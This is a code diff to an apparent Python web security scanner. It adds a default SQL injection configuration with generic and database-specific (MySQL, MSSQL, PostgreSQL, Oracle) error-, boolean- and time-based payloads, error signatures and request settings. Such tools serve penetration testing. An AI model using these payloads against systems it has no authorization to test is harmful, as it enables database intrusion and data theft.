@@ -69,13 +69,163 @@ def load_xss_payload():
         #print(f"xss_payload: {payload}\n")
     return payload_list
 
-def load_sqli_payload():
+def load_sqli_config():
     """加载默认的sqli_payload"""
-    current_dir = os.path.dirname(os.path.abspath(__file__))
-    sqli_payload_path = os.path.join(current_dir, "payload", "sqli.json")
-    with open(sqli_payload_path, 'r',encoding='utf-8') as f:
-        sqli_payload = json.load(f)
-    return sqli_payload
+    try:
+        if os.path.exists("config/sqli.json"):
+            with open("config/sqli.json", 'r',encoding='utf-8') as f:
+                config=json.load(f)
+            return config
+        else:
+            print_colored("[-] 缺少sqli.json配置文件，使用默认配置！", "red")
+            return get_default_sqli_config()
+    except json.JSONDecodeError as e:
+        print_colored(f"[-] 解析sqli.json配置文件出错: {e}", "red")
+        return get_default_sqli_config()
+
+def get_default_sqli_config():
+    """获取默认SQL注入配置"""
+    return {
+        "payloads": {
+            "generic_error_based": [
+                "'",
+                "\"",
+                "' OR '1'='1",
+                "\" OR \"1\"=\"1",
+                "' OR '1'='1' --",
+                "' OR 1=1 --",
+                "' UNION SELECT NULL --",
+                "1' AND SLEEP(5) --",
+                "1' OR '1'='1",
+                "-1' UNION SELECT 1,2,3 --",
+                "admin' --",
+                "1' ORDER BY 1 --",
+                "1' AND 1=2 UNION SELECT 1,2,3 --"
+            ],
+            "mysql_specific": {
+                "error_based": [
+                    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --",
+                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
+                    "' UNION SELECT NULL, version(), NULL --"
+                ],
+                "boolean_based": [
+                    "' AND 1=1 --",
+                    "' AND 1=2 --",
+                    "' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 97 --"
+                ],
+                "time_based": [
+                    "' AND SLEEP(5) --",
+                    "' OR BENCHMARK(5000000, MD5('test')) --"
+                ]
+            },
+            "mssql_specific": {
+                "error_based": [
+                    "' AND 1=CONVERT(int, @@version) --",
+                    "' OR 1 IN (SELECT @@version) --"
+                ],
+                "time_based": [
+                    "' WAITFOR DELAY '00:00:05' --",
+                    "'; WAITFOR DELAY '00:00:05' --"
+                ]
+            },
+            "postgresql_specific": {
+                "error_based": [
+                    "' AND 1=CAST((SELECT version()) AS int) --",
+                    "' OR (SELECT 1 FROM pg_sleep(5)) --"
+                ],
+                "time_based": [
+                    "' OR (SELECT pg_sleep(5)) --",
+                    "'; SELECT pg_sleep(5) --"
+                ]
+            },
+            "oracle_specific": {
+                "error_based": [
+                    "' AND (SELECT * FROM (SELECT NULL FROM DUAL) WHERE 1=1 AND 1=2) IS NULL --",
+                    "' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) --"
+                ],
+                "time_based": [
+                    "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)=0 --",
+                    "' OR DBMS_LOCK.SLEEP(5)=0 --"
+                ]
+            }
+        },
+        "error_indicators": {
+            "mysql": [
+                "you have an error in your sql syntax",
+                "warning: mysql",
+                "mysql_fetch",
+                "mysql_num_rows",
+                "mysqli"
+            ],
+            "mssql": [
+                "unclosed quotation mark",
+                "sql server",
+                "microsoft ole db provider",
+                "odbc driver",
+                "syntax error converting"
+            ],
+            "postgresql": [
+                "postgresql",
+                "pg_",
+                "postgres query failed",
+                "postgres syntax error"
+            ],
+            "oracle": [
+                "ora-",
+                "oracle error",
+                "oracle driver",
+                "oracle odbc",
+                "oracle db"
+            ],
+            "generic": [
+                "sql syntax",
+                "syntax error",
+                "division by zero",
+                "unclosed quotation mark",
+                "quoted string not properly terminated",
+                "mysql error",
+                "sql server",
+                "ora-",
+                "postgresql",
+                "sqlite",
+                "odbc",
+                "jdbc",
+                "pdo",
+                "sql command",
+                "invalid query",
+                "unknown column",
+                "table doesn't exist"
+            ]
+        },
+        "boolean_indicators": {
+            "true_indicators": [
+                "welcome",
+                "success",
+                "logged in",
+                "exists",
+                "found"
+            ],
+            "false_indicators": [
+                "error",
+                "invalid",
+                "not found",
+                "failed",
+                "access denied"
+            ],
+            "length_difference_threshold": 0.3
+        },
+        "time_based_threshold": 3.0,
+        "request_config": {
+            "timeout": 10,
+            "headers": {
+                "User-Agent": "SQLi-Scanner/1.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5"
+            },
+            "max_redirects": 3,
+            "verify_ssl": False
+        }
+    }
 
 # def save_results(results, filename, output_dir="output",type=None):
 #     """
